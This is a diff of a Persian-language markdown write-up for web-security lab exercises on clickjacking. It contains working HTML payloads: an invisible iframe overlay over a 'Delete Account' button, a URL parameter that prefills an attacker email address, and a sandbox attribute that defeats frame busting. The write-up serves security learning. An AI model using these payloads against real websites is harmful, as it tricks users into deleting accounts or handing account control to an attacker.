@@ -2,7 +2,7 @@
 
 ## Exploit
 - **حمله مقدماتی با حفاظت CSRF Token**
-  - در کد زیر پیکسل ها را تغییر می دهیم تا متن *Click me* روی کلید *Delete Account* بیفند ، برای این کار باید ابتدا opacity را برابر 0.1 قرار دهیم و پس از بدست آوردن موقعیت درست، آن را روی 0.0001 تنظیم کنیم
+  - در کد زیر پیکسل ها را تغییر می دهیم تا متن *Click me* روی کلید *Delete Account* بیفند ، برای این کار باید ابتدا opacity را برابر 0.1 قرار دهیم و پس از بدست آوردن موقعیت درست، آن را روی 0.0001 تنظیم کنیم:
 ```HTML
 <style>
    iframe {
@@ -23,8 +23,13 @@
 <iframe src="https://ac721fc61e66ddc6c0325ed500ca00d4.web-security-academy.net/my-account"></iframe>
 ```
 - **پر کردن خودکار فیلدهای فرم با استفاده از URL Param**
-  - برای این منظور در کد فوق تگ iframe را به شکل زیر تغییر می دهیم
+  - برای این منظور در کد فوق تگ iframe را به شکل زیر تغییر می دهیم:
 ```HTML
-<iframe src="$url?email=hacker@attacker-website.com"></iframe>
+<iframe src="https://ac721fc61e66ddc6c0325ed500ca00d4.web-security-academy.net/my-account?email=hacker@attacker-website.com"></iframe>
 ```
-- س
+- **بای پاس کردن frame buster**
+  - برای این کار  attribute زیر را به تگ iframe اضافه می کنیم:
+```HTML
+<iframe sandbox="allow-forms" src="https://ac1f1fd41fe93c54c00a5216000e009e.web-security-academy.net/my-account?email=hacker@attacker-website.com"></iframe>
+``` 
+- ی
